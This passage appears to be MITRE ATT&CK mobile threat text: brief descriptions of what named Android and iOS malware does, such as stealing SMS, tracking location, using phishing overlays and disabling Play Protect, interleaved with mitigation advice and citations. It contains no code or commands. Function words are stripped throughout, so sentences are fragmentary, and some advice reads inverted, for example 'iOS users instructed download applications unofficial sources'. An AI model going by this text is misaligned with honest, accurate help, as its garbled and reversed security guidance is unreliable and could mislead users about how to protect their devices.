tool).(Citation: PaloAlto-XcodeGhost1)(Citation: PaloAlto-XcodeGhost)  [Android/Chuli.A](https://attack.mitre.org/software/S0304) stole SMS message content.(Citation: Kaspersky-WUC) [WolfRAT](https://attack.mitre.org/software/S0489) collect device’s contact list.(Citation: Talos-WolfRAT) [Anubis](https://attack.mitre.org/software/S0422) phone calls.(Citation: Cofense Anubis) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) encrypted DEX payload.(Citation: CYBERWARCON CHEMISTGAMES) [DroidJack](https://attack.mitre.org/software/S0320) capture video device cameras.(Citation: Zscaler-SuperMarioRun) [Pegasus iOS](https://attack.mitre.org/software/S0289) modifies partition maintain persistence.(Citation: Lookout-Pegasus) [Charger](https://attack.mitre.org/software/S0323) locks device granted admin permissions, displaying message demanding ransom payment.(Citation: CheckPoint-Charger) [DroidJack](https://attack.mitre.org/software/S0320) capable recording device phone calls.(Citation: Zscaler-SuperMarioRun) [eSurv](https://attack.mitre.org/software/S0507) exfiltrate device pictures.(Citation: Lookout eSurv) Users instructed links applications don’t recognize. [INSOMNIA](https://attack.mitre.org/software/S0463) list installed non-Apple applications.(Citation: Google Project Insomnia) [Agent Smith](https://attack.mitre.org/software/S0440) obtains device’s application list.(Citation: CheckPoint Agent Smith) [SpyDealer](https://attack.mitre.org/software/S0324) downloads executes root exploits remote server.(Citation: PaloAlto-SpyDealer) [Tiktok Pro](https://attack.mitre.org/software/S0558) collect SMS messages device.(Citation: Zscaler TikTok Spyware)  Typically, insecure malicious configuration settings installed user's consent. Users advised install unexpected configuration settings (CA certificates, iOS Configuration Profiles, Mobile Device Management server provisioning).  [Anubis](https://attack.mitre.org/software/S0422) collect list installed applications compare list targeted applications.(Citation: Cofense Anubis) [ViperRAT](https://attack.mitre.org/software/S0506) collect information, including brand, manufacturer, serial number.(Citation: Lookout ViperRAT) [Windshift](https://attack.mitre.org/groups/G0112) included enumeration malicious apps deployed Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [Dendroid](https://attack.mitre.org/software/S0301) collect device’s photos, browser history, bookmarks, accounts stored device.(Citation: Lookout-Dendroid) [WolfRAT](https://attack.mitre.org/software/S0489) collect user account, photos, browser history, arbitrary files.(Citation: Talos-WolfRAT)  [Gustuff](https://attack.mitre.org/software/S0406) collect contact list.(Citation: Talos Gustuff Apr 2019)  [Tiktok Pro](https://attack.mitre.org/software/S0558) send SMS messages.(Citation: Zscaler TikTok Spyware)  [Desert Scorpion](https://attack.mitre.org/software/S0505) collect device metadata check device rooted.(Citation: Lookout Desert Scorpion) [Desert Scorpion](https://attack.mitre.org/software/S0505) collect attacker-specified files, including files located external storage.(Citation: Lookout Desert Scorpion)	 [DEFENSOR ID](https://attack.mitre.org/software/S0479) retrieve list installed applications.(Citation: ESET DEFENSOR ID) [FinFisher](https://attack.mitre.org/software/S0182) accesses exfiltrates log.(Citation: Lookout Dark Caracal Jan 2018) [CarbonSteal](https://attack.mitre.org/software/S0529) dynamically load additional functionality.(Citation: Lookout Uyghur Campaign) [Anubis](https://attack.mitre.org/software/S0422) create overlays capture user credentials targeted applications.(Citation: Cofense Anubis) [SpyDealer](https://attack.mitre.org/software/S0324) harvests phone history victims.(Citation: PaloAlto-SpyDealer) [SpyDealer](https://attack.mitre.org/software/S0324) maintains persistence installing Android application package (APK) partition.(Citation: PaloAlto-SpyDealer) Original samples [BrainTest](https://attack.mitre.org/software/S0293) download exploit packs rooting remote server installation.(Citation: Lookout-BrainTest) [Dvmap](https://attack.mitre.org/software/S0420) checks Android version determine library patch.(Citation: SecureList DVMap June 2017) [Xbot](https://attack.mitre.org/software/S0298) encrypt victim's files external storage card) request PayPal cash card ransom.(Citation: PaloAlto-Xbot) [Cerberus](https://attack.mitre.org/software/S0480) collect device’s location.(Citation: Threat Fabric Cerberus) [DualToy](https://attack.mitre.org/software/S0315) collects connected iOS device’s including IMEI, IMSI, ICCID, serial phone number.(Citation: PaloAlto-DualToy) [Monokle](https://attack.mitre.org/software/S0407) controlled phone set "control phones."(Citation: Lookout-Monokle) [Circles](https://attack.mitre.org/software/S0602) track location mobile devices.(Citation: CitizenLab Circles) [MazarBOT](https://attack.mitre.org/software/S0303) intercept two-factor authentication codes online banking apps.(Citation: Tripwire-MazarBOT) [Twitoor](https://attack.mitre.org/software/S0302) hide presence system.(Citation: ESET-Twitoor) Security architecture improvements version Android iOS difficult escalate privileges. Additionally, versions Android strengthened sandboxing applied applications, restricting ability enumerate file contents. [Corona Updates](https://attack.mitre.org/software/S0425) pictures camera record MP4 files.(Citation: TrendMicro Coronavirus Updates) [eSurv](https://attack.mitre.org/software/S0507) track device’s location.(Citation: Lookout eSurv) [Mandrake](https://attack.mitre.org/software/S0485) block, forward, hide, send SMS messages.(Citation: Bitdefender Mandrake) Enterprises provision policies mobile devices require minimum complexity (length, character requirements, etc.) device passcode, device wipe data incorrect passcode entered times. policies mitigate brute-force, guessing, shoulder surfing device passcode. Enterprises provision policies disable biometric authentication, however, biometric authentication longer, complex passcode practical entered frequently.  [TrickMo](https://attack.mitre.org/software/S0427) inject input set default SMS handler, automatically pop-ups user time react.(Citation: SecurityIntelligence TrickMo) [Ginp](https://attack.mitre.org/software/S0423) multi-step phishing overlay capture banking credentials credit card login.(Citation: ThreatFabric Ginp) Mobile security products action jailbroken devices detected, limiting adversary’s access password stores. [Mandrake](https://attack.mitre.org/software/S0485) record screen.(Citation: Bitdefender Mandrake) [FlexiSpy](https://attack.mitre.org/software/S0408) monitor device photos access browser history bookmarks.(Citation: FlexiSpy-Features) Android Verified Boot detect unauthorized modifications partition, lead execution flow hijacking.(Citation: Android-VerifiedBoot)  [Asacub](https://attack.mitre.org/software/S0540) collect pieces device network configuration information, mobile network operator.(Citation: Securelist Asacub) [CarbonSteal](https://attack.mitre.org/software/S0529) gathered device metadata, including model, manufacturer, card size, disk usage, memory, CPU, serial number.(Citation: Lookout Uyghur Campaign) Users taught Device Administrator permissions dangerous, applications it. [FakeSpy](https://attack.mitre.org/software/S0509) stores malicious code encrypted asset files decrypted runtime. versions [FakeSpy](https://attack.mitre.org/software/S0509) encrypt C2 address.(Citation: Cybereason FakeSpy) [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) checked apps installed, Facebook FB Messenger installed.(Citation: WeLiveSecurity AdDisplayAshas) (Citation: Trend Micro Bouncing Golf 2019) [Stealth Mango](https://attack.mitre.org/software/S0328) uploads calendar events reminders.(Citation: Lookout-StealthMango) [PJApps](https://attack.mitre.org/software/S0291) capability collect leak victim's phone number, mobile device unique identifier (IMEI).(Citation: Lookout-EnterpriseApps)  [Exodus](https://attack.mitre.org/software/S0405) queries device IMEI code phone validate target infection.(Citation: SWB Exodus March 2019)  [BrainTest](https://attack.mitre.org/software/S0293) stores secondary Android app package (APK) assets directory encrypted form, decrypts payload runtime.(Citation: Lookout-BrainTest) [Cerberus](https://attack.mitre.org/software/S0480) send SMS messages device.(Citation: Threat Fabric Cerberus) [GPlayed](https://attack.mitre.org/software/S0536) request device administrator permissions.(Citation: Talos GPlayed) Android 7 changed Device Administrator password APIs function. [FinFisher](https://attack.mitre.org/software/S0182) device microphone record phone conversations.(Citation: Lookout Dark Caracal Jan 2018) [GoldenEagle](https://attack.mitre.org/software/S0551) messages attacker-controlled number.(Citation: Lookout Uyghur Campaign) [Tangelo](https://attack.mitre.org/software/S0329) functionality gather GPS coordinates.(Citation: Lookout-StealthMango) [Pegasus iOS](https://attack.mitre.org/software/S0289) monitors victim status disables access phone jailbreaking software.(Citation: Lookout-Pegasus) [KeyRaider](https://attack.mitre.org/software/S0288/) samples hook SSLRead SSLWrite functions itunesstored process intercept device communication Apple App Store.(Citation: Skycure-Profiles) versions Android modified device administrator applications uninstalled, easier user remove them. Android 7 introduced updates revoke standard device administrators’ ability reset device’s passcode.  [Cerberus](https://attack.mitre.org/software/S0480) disables Google Play Protect prevent discovery deletion future.(Citation: Threat Fabric Cerberus) Android 9 restricts access microphone, camera, sensors background applications.(Citation: Android Capture Sensor 2019)  [Riltok](https://attack.mitre.org/software/S0403) query details device, including phone number, country, mobile operator, model, root availability, operating version.(Citation: Kaspersky Riltok June 2019) [SilkBean](https://attack.mitre.org/software/S0549) access camera device.(Citation: Lookout Uyghur Campaign) [Pegasus iOS](https://attack.mitre.org/software/S0289) gathers contacts dumping victim's address book.(Citation: Lookout-Pegasus) [Anubis](https://attack.mitre.org/software/S0422) modify administrator settings disable Play Protect.(Citation: Cofense Anubis) [ViperRAT](https://attack.mitre.org/software/S0506) track device’s location.(Citation: Lookout ViperRAT) [Gustuff](https://attack.mitre.org/software/S0406) abuses accessibility features intercept interactions user device.(Citation: Talos Gustuff Apr 2019) [Pegasus iOS](https://attack.mitre.org/software/S0289) captures SMS messages victim sends receives.(Citation: Lookout-Pegasus) [Agent Smith](https://attack.mitre.org/software/S0440) hide icon application launcher.(Citation: CheckPoint Agent Smith) OS versions difficult applications register VPN providers.  [GoldenEagle](https://attack.mitre.org/software/S0551) photos device camera.(Citation: Lookout Uyghur Campaign) [TrickMo](https://attack.mitre.org/software/S0427) controlled encrypted SMS message.(Citation: SecurityIntelligence TrickMo) [Pallas](https://attack.mitre.org/software/S0399) accesses device contact list.(Citation: Lookout Dark Caracal Jan 2018) [Golden Cup](https://attack.mitre.org/software/S0535) collect images, videos, attacker-specified files.(Citation: Symantec GoldenCup) [Anubis](https://attack.mitre.org/software/S0422) ransomware module encrypt device data hold ransom.(Citation: Cofense Anubis) Users advised extra scrutinous applications request location, deny permissions requests applications recognize. [Adups](https://attack.mitre.org/software/S0309) pre-installed Android devices vendors.(Citation: NYTimes-BackDoor)(Citation: BankInfoSecurity-BackDoor) [Triada](https://attack.mitre.org/software/S0424) Android third-party vendor identified Yehuo Blazefire production process.(Citation: Google Triada June 2019)(Citation: Krebs-Triada June 2019) [Anubis](https://attack.mitre.org/software/S0422) retrieve device’s GPS location.(Citation: Cofense Anubis) [SilkBean](https://attack.mitre.org/software/S0549) delete piece device data, contacts, logs, applications, SMS messages, email, plugins, files external storage.(Citation: Lookout Uyghur Campaign) [Tiktok Pro](https://attack.mitre.org/software/S0558) screenshots.(Citation: Zscaler TikTok Spyware) [Corona Updates](https://attack.mitre.org/software/S0425) collect device contacts.(Citation: TrendMicro Coronavirus Updates) [DressCode](https://attack.mitre.org/software/S0300) sets "general purpose tunnel" adversary compromise enterprise networks mobile device connected to.(Citation: TrendMicro-DressCode) [INSOMNIA](https://attack.mitre.org/software/S0463) communicated C2 HTTPS requests ports 43111, 43223, 43773.(Citation: Volexity Insomnia) [Judy](https://attack.mitre.org/software/S0325) bypasses Google Play's protections downloading malicious payload runtime installation.(Citation: CheckPoint-Judy) [Dendroid](https://attack.mitre.org/software/S0301) send block SMS messages.(Citation: Lookout-Dendroid) Mobile security software typically detect device rooted jailbroken inform user, action. iOS users instructed download applications unofficial sources, applications distributed Apple App Store list installed applications device. [Asacub](https://attack.mitre.org/software/S0540) communicated C2 POST requests.(Citation: Securelist Asacub) Android iOS include partition integrity mechanisms detect unauthorized modifications.  [Corona Updates](https://attack.mitre.org/software/S0425) collect SMS messages.(Citation: TrendMicro Coronavirus Updates) [Xbot](https://attack.mitre.org/software/S0298) steals SMS message contact intercepts parses SMS messages.(Citation: PaloAlto-Xbot) [XLoader Android](https://attack.mitre.org/software/S0318) collects SMS messages.(Citation: TrendMicro-XLoader) [Android/Chuli.A](https://attack.mitre.org/software/S0304) gathered including phone number, OS version, phone model, SDK version.(Citation: Kaspersky-WUC) [HenBox](https://attack.mitre.org/software/S0544) registered broadcast receivers.(Citation: Palo Alto HenBox) [Rotexy](https://attack.mitre.org/software/S0411) communicate command control server JSON payloads POST request bodies. communicate JSON messages Google Cloud Messaging.(Citation: securelist rotexy 2018) [Charger](https://attack.mitre.org/software/S0323) checks local settings device malicious logic device located Ukraine, Russia, Belarus.(Citation: CheckPoint-Charger) [Cerberus](https://attack.mitre.org/software/S0480) communicates C2 server HTTP.(Citation: CheckPoint Cerberus) [Mandrake](https://attack.mitre.org/software/S0485) disable Play Protect.(Citation: Bitdefender Mandrake) `HIDE_OVERLAY_WINDOWS` permission introduced Android 12 allowing apps hide overlay windows type `TYPE_APPLICATION_OVERLAY` drawn apps `SYSTEM_ALERT_WINDOW` permission, preventing applications creating overlay windows current application.(Citation: Android 12 Features) [Agent Smith](https://attack.mitre.org/software/S0440) deletes infected applications’ update packages detected system, preventing updates.(Citation: CheckPoint Agent Smith)   [Bread](https://attack.mitre.org/software/S0432) collects device’s IMEI, carrier, mobile country code, mobile network code.(Citation: Google Bread) OS releases frequently additional limitations controls device location access. [FakeSpy](https://attack.mitre.org/software/S0509) collect device information, including OS version device model.(Citation: Cybereason FakeSpy) [INSOMNIA](https://attack.mitre.org/software/S0463) collect device’s contact list.(Citation: Google Project Insomnia) [Asacub](https://attack.mitre.org/software/S0540) collect device’s contact list.(Citation: Securelist Asacub) [CarbonSteal](https://attack.mitre.org/software/S0529) collected device network information, including 16-bit GSM Cell Identity, 16-bit Location Code, Mobile Country Code (MCC), Mobile Network Code (MNC). [CarbonSteal](https://attack.mitre.org/software/S0529) called `netcfg` stats.(Citation: Lookout Uyghur Campaign)  Apple regularly security updates OS vulnerabilities.  [HenBox](https://attack.mitre.org/software/S0544) access device’s microphone.(Citation: Palo Alto HenBox) [INSOMNIA](https://attack.mitre.org/software/S0463) retrieve history.(Citation: Google Project Insomnia) [Concipit1248](https://attack.mitre.org/software/S0426) requests permissions device camera.(Citation: TrendMicro Coronavirus Updates) [Golden Cup](https://attack.mitre.org/software/S0535) track device’s location.(Citation: Symantec GoldenCup) Device attestation detect jailbroken devices.  [Desert Scorpion](https://attack.mitre.org/software/S0505) record videos.(Citation: Lookout Desert Scorpion) [Tiktok Pro](https://attack.mitre.org/software/S0558) list installed applications.(Citation: Zscaler TikTok Spyware) [Desert Scorpion](https://attack.mitre.org/software/S0505) collect device’s contact list.(Citation: Lookout Desert Scorpion) [Corona Updates](https://attack.mitre.org/software/S0425) record MP4 files monitor calls.(Citation: TrendMicro Coronavirus Updates)  [FlexiSpy](https://attack.mitre.org/software/S0408) capable hiding SuperSU's icon installed visible.(Citation: FortiGuard-FlexiSpy)  [FlexiSpy](https://attack.mitre.org/software/S0408) hide icon detection uninstallation process difficult.(Citation: FlexiSpy-Features) [TERRACOTTA](https://attack.mitre.org/software/S0545) registered broadcast receivers.(Citation: WhiteOps TERRACOTTA) [Tiktok Pro](https://attack.mitre.org/software/S0558) check device’s battery status.(Citation: Zscaler TikTok Spyware) [Desert Scorpion](https://attack.mitre.org/software/S0505) delete copies additional APKs downloaded external storage.(Citation: Lookout Desert Scorpion) [RCSAndroid](https://attack.mitre.org/software/S0295) SMS command control.(Citation: TrendMicro-RCSAndroid) [RCSAndroid](https://attack.mitre.org/software/S0295) ability dynamically download execute code runtime.(Citation: TrendMicro-RCSAndroid)  [Rotexy](https://attack.mitre.org/software/S0411) retrieves list installed applications sends command control server.(Citation: securelist rotexy 2018) [Adups](https://attack.mitre.org/software/S0309) transmitted location information.(Citation: NYTimes-BackDoor) Mobile OSes implemented measures difficult trick users installing untrusted certificates configurations. iOS 10.3 add additional step users install trusted certificates configuration profiles. Android, apps target compatibility Android 7 (API Level 24) default trusting certificates bundled operating system, certificates user administrator, decreasing susceptibility successful adversary-in-the-middle attack.(Citation: Symantec-iOSProfile2)(Citation: Android-TrustedCA) [Corona Updates](https://attack.mitre.org/software/S0425) communicates C2 server requests.(Citation: TrendMicro Coronavirus Updates) [Mandrake](https://attack.mitre.org/software/S0485) obfuscates hardcoded C2 URLs.(Citation: Bitdefender Mandrake) [GPlayed](https://attack.mitre.org/software/S0536) wipe device.(Citation: Talos GPlayed) [Anubis](https://attack.mitre.org/software/S0422) steal device’s contact list.(Citation: Cofense Anubis)   [Exodus](https://attack.mitre.org/software/S0405) record audio compromised device's microphone record audio 3GP format.(Citation: SWB Exodus March 2019)  Android 8 introduced additional limitations implicit intents application register for.(Citation: Android Broadcasts)  [WolfRAT](https://attack.mitre.org/software/S0489) perform primitive emulation checks.(Citation: Talos-WolfRAT) [GoldenEagle](https://attack.mitre.org/software/S0551) recorded calls environment audio .amr format.(Citation: Lookout Uyghur Campaign) [Exobot](https://attack.mitre.org/software/S0522) HTTPS C2 communication.(Citation: Threat Fabric Exobot) [Windshift](https://attack.mitre.org/groups/G0112) included SMS message exfiltration malicious apps deployed Operation BULL Operation ROCK.(Citation: BlackBerry Bahamut) [DroidJack](https://attack.mitre.org/software/S0320) captures SMS data.(Citation: Zscaler-SuperMarioRun) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) utilized native code decrypt malicious payload.(Citation: CYBERWARCON CHEMISTGAMES) 
[ANDROIDOS_ANSERVER.A](https://attack.mitre.org/software/S0310) gathers device IMEI IMSI.(Citation: TrendMicro-Anserver2) [WolfRAT](https://attack.mitre.org/software/S0489)’s code obfuscated.(Citation: Talos-WolfRAT) [Tangelo](https://attack.mitre.org/software/S0329) accesses databases WhatsApp, Viber, Skype, Line.(Citation: Lookout-StealthMango) Device attestation detect devices unauthorized unsafe modifications.  [EventBot](https://attack.mitre.org/software/S0478) collect OS version, device vendor, type screen lock active device.(Citation: Cybereason EventBot) [Riltok](https://attack.mitre.org/software/S0403) fake Google Play screen requesting bank card credentials mimic screen relevant mobile banking apps request user/bank card details.(Citation: Kaspersky Riltok June 2019) [SpyDealer](https://attack.mitre.org/software/S0324) enables remote control victim SMS channels.(Citation: PaloAlto-SpyDealer) [Pallas](https://attack.mitre.org/software/S0399) queries device metadata, device ID, OS version, cameras.(Citation: Lookout Dark Caracal Jan 2018) [Monokle](https://attack.mitre.org/software/S0407) checks device connected Wi-Fi mobile data.(Citation: Lookout-Monokle)  [Monokle](https://attack.mitre.org/software/S0407/) install attacker-specified certificates device's trusted certificate store, enabling adversary perform adversary-in-the-middle attacks.(Citation: Xiao-KeyRaider) case, [Stealth Mango](https://attack.mitre.org/software/S0328) installed physical access device repair shop.(Citation: Lookout-StealthMango) [Pegasus iOS](https://attack.mitre.org/software/S0289) update sends location phone.(Citation: Lookout-Pegasus) Log access uncommonly permission, users instructedto extra scrutiny granting access logs.  [RedDrop](https://attack.mitre.org/software/S0326) standard exfiltration.(Citation: Wandera-RedDrop) [Dvmap](https://attack.mitre.org/software/S0420) enable installation apps unknown sources.(Citation: SecureList DVMap June 2017) Security updates patches integrity checking mechanisms detect unauthorized hardware modifications. Security updates patches inhibit software compromises. [TrickMo](https://attack.mitre.org/software/S0427) collect device network operator, model, brand, OS version.(Citation: SecurityIntelligence TrickMo) [Gustuff](https://attack.mitre.org/software/S0406) gathers device IMEI send command control server.(Citation: Talos Gustuff Apr 2019)  Security updates patches vulnerabilities exploited root access. Root access requirement impairing defenses. [HenBox](https://attack.mitre.org/software/S0544) steal data sources, including chat, communication, social media apps.(Citation: Palo Alto HenBox) [Agent Smith](https://attack.mitre.org/software/S0440) exploits OS vulnerabilities, including Janus, replace legitimate applications malicious versions.(Citation: CheckPoint Agent Smith)  [Gustuff](https://attack.mitre.org/software/S0406) SMS command control defined admin phone number.(Citation: Talos Gustuff Apr 2019)  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors Android backdoors capable enumerating specific files infected devices.(Citation: Cylance Dust Storm) [Concipit1248](https://attack.mitre.org/software/S0426) collect device photos.(Citation: TrendMicro Coronavirus Updates) [Desert Scorpion](https://attack.mitre.org/software/S0505) collect account stored device.(Citation: Lookout Desert Scorpion) [Zen](https://attack.mitre.org/software/S0494) base64 encodes strings searches for.(Citation: Google Security Zen) [CHEMISTGAMES](https://attack.mitre.org/software/S0555) collect files filesystem account Google Chrome.(Citation: CYBERWARCON CHEMISTGAMES) [AndroRAT](https://attack.mitre.org/software/S0292) captures SMS messages.(Citation: Lookout-EnterpriseApps) [Anubis](https://attack.mitre.org/software/S0422) screenshots.(Citation: Cofense Anubis) [Windshift](https://attack.mitre.org/groups/G0112) included keylogging capabilities Operation ROCK.(Citation: BlackBerry Bahamut) [Desert Scorpion](https://attack.mitre.org/software/S0505) track device’s location.(Citation: Lookout Desert Scorpion) [Golden Cup](https://attack.mitre.org/software/S0535) collect device’s contact list.(Citation: Symantec GoldenCup) [BusyGasper](https://attack.mitre.org/software/S0655) record device’s camera.(Citation: SecureList BusyGasper) [Rotexy](https://attack.mitre.org/software/S0411) hides icon launch.(Citation: securelist rotexy 2018) running Huawei device, [Desert Scorpion](https://attack.mitre.org/software/S0505) adds protected apps list, screen off.(Citation: Lookout Desert Scorpion) Users wary granting applications dangerous privacy-intrusive permissions, access location information. Users protect account credentials enable multi-factor authentication options available.  Users instructed links applications don’t recognize. [Android/Chuli.A](https://attack.mitre.org/software/S0304) stole geo-location data.(Citation: Kaspersky-WUC) [HenBox](https://attack.mitre.org/software/S0544) collect device check device running MIUI Xiaomi device.(Citation: Palo Alto HenBox) [Bread](https://attack.mitre.org/software/S0432) communicates C2 server requests.(Citation: Google Bread) [HenBox](https://attack.mitre.org/software/S0544) list running processes.(Citation: Palo Alto HenBox) [Rotexy](https://attack.mitre.org/software/S0411) collects running processes.(Citation: securelist rotexy 2018) [Marcher](https://attack.mitre.org/software/S0317) requests Android Device Administrator access.(Citation: Proofpoint-Marcher)  [Monokle](https://attack.mitre.org/software/S0407) remount partition read/write install attacker-specified certificates.(Citation: Lookout-Monokle)  [FlexiSpy](https://attack.mitre.org/software/S0408) communicate command control server ports 12512 12514.(Citation: FortiGuard-FlexiSpy) [RCSAndroid](https://attack.mitre.org/software/S0295) monitor clipboard content.(Citation: TrendMicro-RCSAndroid) [BusyGasper](https://attack.mitre.org/software/S0655) download payload updates C2 server email attachments adversary’s inbox.(Citation: SecureList BusyGasper) [X-Agent Android](https://attack.mitre.org/software/S0314) believed locational data Ukrainian artillery forces.(Citation: CrowdStrike-Android) [Dvmap](https://attack.mitre.org/software/S0420) `VerifyApps`, grant Device Administrator permissions commands only, UI.(Citation: SecureList DVMap June 2017) [Mandrake](https://attack.mitre.org/software/S0485) abuse device administrator permissions ensure uninstalled permissions revoked.(Citation: Bitdefender Mandrake)  [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) hidden C2 server address base-64 encoding. (Citation: WeLiveSecurity AdDisplayAshas) Device attestation detect jailbroken rooted devices. [SimBad](https://attack.mitre.org/software/S0419) generates fraudulent advertising revenue displaying ads background browser displaying ads.(Citation: CheckPoint SimBad 2019) [Ginp](https://attack.mitre.org/software/S0423) list installed applications.(Citation: ThreatFabric Ginp) [CarbonSteal](https://attack.mitre.org/software/S0529) access device’s location track device time.(Citation: Lookout Uyghur Campaign) [ViceLeaker](https://attack.mitre.org/software/S0418) collect location information, including GPS coordinates.(Citation: SecureList - ViceLeaker 2019)(Citation: Bitdefender - Triout 2018)  [WolfRAT](https://attack.mitre.org/software/S0489) `dumpsys` determine applications running.(Citation: Talos-WolfRAT) [Exodus](https://attack.mitre.org/software/S0405) capture SMS messages.(Citation: SWB Exodus March 2019) [TERRACOTTA](https://attack.mitre.org/software/S0545) list installed apps.(Citation: WhiteOps TERRACOTTA) [RedDrop](https://attack.mitre.org/software/S0326) ads links websites encourage users download malicious apps complex content distribution network (CDN) series network redirects. [RedDrop](https://attack.mitre.org/software/S0326) downloads additional components (APKs, JAR files) C2 servers.(Citation: Wandera-RedDrop)  [Monokle](https://attack.mitre.org/software/S0407) retrieve device's contact list.(Citation: Lookout-Monokle) [Stealth Mango](https://attack.mitre.org/software/S0328) uploads contact lists third-party applications Yahoo, AIM, GoogleTalk, Skype, QQ, others.(Citation: Lookout-StealthMango) [Rotexy](https://attack.mitre.org/software/S0411) phishing overlays capture users' credit card information.(Citation: securelist rotexy 2018) [Gooligan](https://attack.mitre.org/software/S0290) steals authentication tokens access data multiple Google applications.(Citation: Gooligan Citation) [Golden Cup](https://attack.mitre.org/software/S0535) collect directory listing external storage.(Citation: Symantec GoldenCup) [FlexiSpy](https://attack.mitre.org/software/S0408) encrypts configuration file AES.(Citation: FortiGuard-FlexiSpy) [Pegasus iOS](https://attack.mitre.org/software/S0289) accesses sensitive data files, saving Skype calls reading Skype database files.(Citation: Lookout-Pegasus) [GPlayed](https://attack.mitre.org/software/S0536) base64-encoded exfiltrated data, replacing base64 characters obfuscate data.(Citation: Talos GPlayed) [EventBot](https://attack.mitre.org/software/S0478) abuse Android’s accessibility service capture data installed applications.(Citation: Cybereason EventBot) [Mandrake](https://attack.mitre.org/software/S0485) Firebase C2.(Citation: Bitdefender Mandrake) [Corona Updates](https://attack.mitre.org/software/S0425) collect device network configuration information, Wi-Fi SSID IMSI.(Citation: TrendMicro Coronavirus Updates) Users cautioned granting administrative access applications. [Red Alert 2.0](https://attack.mitre.org/software/S0539) fetch backup C2 domain Twitter primary C2 unresponsive.(Citation: Sophos Red Alert 2.0) [Skygofree](https://attack.mitre.org/software/S0327) download executable code C2 server implant starts specific command.(Citation: Kaspersky-Skygofree) [Red Alert 2.0](https://attack.mitre.org/software/S0539) communicated C2 requests port 7878.(Citation: Sophos Red Alert 2.0) [DoubleAgent](https://attack.mitre.org/software/S0550) FTP TCP sockets data exfiltration.(Citation: Lookout Uyghur Campaign) [DoubleAgent](https://attack.mitre.org/software/S0550) exploit tools gain root, TowelRoot.(Citation: Lookout Uyghur Campaign) [Android/AdDisplay.Ashas](https://attack.mitre.org/software/S0525) registered receive `BOOT_COMPLETED` broadcast intent activate device startup.(Citation: WeLiveSecurity AdDisplayAshas) [SilkBean](https://attack.mitre.org/software/S0549) access SMS messages.(Citation: Lookout Uyghur Campaign) [XLoader Android](https://attack.mitre.org/software/S0318) loads encrypted DEX code payload.(Citation: TrendMicro-XLoader) [Gustuff](https://attack.mitre.org/software/S0406) communicates command control server requests.(Citation: Talos Gustuff Apr 2019) [Zen](https://attack.mitre.org/software/S0494) modify SELinux enforcement mode.(Citation: Google Security Zen) Users encouraged careful applications grant SMS access to. Further, users change default SMS handler applications recognize.(Citation: SMS KitKat) [Stealth Mango](https://attack.mitre.org/software/S0328) collects uploads SIM card phone device.(Citation: Lookout-StealthMango) [RCSAndroid](https://attack.mitre.org/software/S0295) collect passwords Wi-Fi networks online accounts, including Skype, Facebook, Twitter, Google, WhatsApp, Mail, LinkedIn.(Citation: TrendMicro-RCSAndroid) [Pegasus Android](https://attack.mitre.org/software/S0316) accesses calendar entries.(Citation: Lookout-PegasusAndroid) [Adups](https://attack.mitre.org/software/S0309) transmitted contact lists.(Citation: NYTimes-BackDoor) [Asacub](https://attack.mitre.org/software/S0540) send SMS messages compromised devices.(Citation: Securelist Asacub)  [SilkBean](https://attack.mitre.org/software/S0549) access logs.(Citation: Lookout Uyghur Campaign) [ANDROIDOS_ANSERVER.A](https://attack.mitre.org/software/S0310) gathers device OS version, device build version, manufacturer, model.(Citation: TrendMicro-Anserver2) [Gustuff](https://attack.mitre.org/software/S0406) gathers device, including default SMS application, SafetyNet enabled, battery level, operating version, malware elevated permissions.(Citation: Talos Gustuff Apr 2019) [Pallas](https://attack.mitre.org/software/S0399) tracks latitude longitude coordinates infected device.(Citation: Lookout Dark Caracal Jan 2018) Attestation typically detect rooted devices. MDM-enrolled devices, action device fails attestation check.  Providing user guidance commonly abused features, modal requests administrator permissions, aid preventing impairing defenses. Starting 2017, [Rotexy](https://attack.mitre.org/software/S0411) DEX file packed garbage strings operations.(Citation: securelist rotexy 2018) Android 11 introduced privacy enhancements package visibility, filtering returned package manager. iOS 12 removed private API list installed applications non-app store applications.(Citation: Android Package Visibility)  [DEFENSOR ID](https://attack.mitre.org/software/S0479) Firebase Cloud Messaging C2.(Citation: ESET DEFENSOR ID)  [GolfSpy](https://attack.mitre.org/software/S0421) list installed applications.(Citation: Trend Micro Bouncing Golf 2019) Filtering requests checking request origin provide defense spurious operators.(Citation: CSRIC5-WG10-FinalReport)  [FrozenCell](https://attack.mitre.org/software/S0577) searched pdf, doc, docx, ppt, pptx, xls, xlsx file types exfiltration.(Citation: Lookout FrozenCell) [Gustuff](https://attack.mitre.org/software/S0406) WebView overlays prompt user device unlock code, banking cryptocurrency application credentials. [Gustuff](https://attack.mitre.org/software/S0406) send push notifications pretending bank, triggering phishing overlay.(Citation: Talos Gustuff Apr 2019)(Citation: IB Gustuff Mar 2019)  Android introduced prevent applications accessing clipboard data foreground set device’s default IME.(Citation: Android Privacy Changes)  [XLoader Android](https://attack.mitre.org/software/S0318) fetched C2 address encoded Twitter names, Instagram Tumblr.(Citation: TrendMicro-XLoader-FakeSpy) [Gooligan](https://attack.mitre.org/software/S0290) executes Android root exploits.(Citation: Gooligan Citation) [AndroRAT](https://attack.mitre.org/software/S0292) collects contact list information.(Citation: Lookout-EnterpriseApps) Users wary granting applications dangerous privacy-intrusive permissions, keyboard registration accessibility service access. iOS 11.4.1 introduce USB Restricted Mode, disables data access device's charging port conditions (making port usable power), preventing technique working.(Citation: Elcomsoft-iOSRestricted) [INSOMNIA](https://attack.mitre.org/software/S0463) communicates C2 server HTTPS requests.(Citation: Volexity Insomnia) Security updates typically provide patches vulnerabilities abused malicious applications. July 2016, [HummingBad](https://attack.mitre.org/software/S0322) generated $300,000 month revenue installing fraudulent apps displaying malicious advertisements.(Citation: ArsTechnica-HummingBad) [Cerberus](https://attack.mitre.org/software/S0480) collect device information, default SMS app device locale.(Citation: Threat Fabric Cerberus)(Citation: CheckPoint Cerberus) [Exodus](https://attack.mitre.org/software/S0405) attempts connect port 22011 provide remote reverse shell.(Citation: SWB Exodus March 2019) iOS, `allowEnterpriseAppTrust` `allowEnterpriseAppTrustModification` configuration profile restrictions prevent users installing apps signed enterprise distribution keys.  [GoldenEagle](https://attack.mitre.org/software/S0551) download code update itself.(Citation: Lookout Uyghur Campaign) Device attestation detect unauthorized operating modifications. 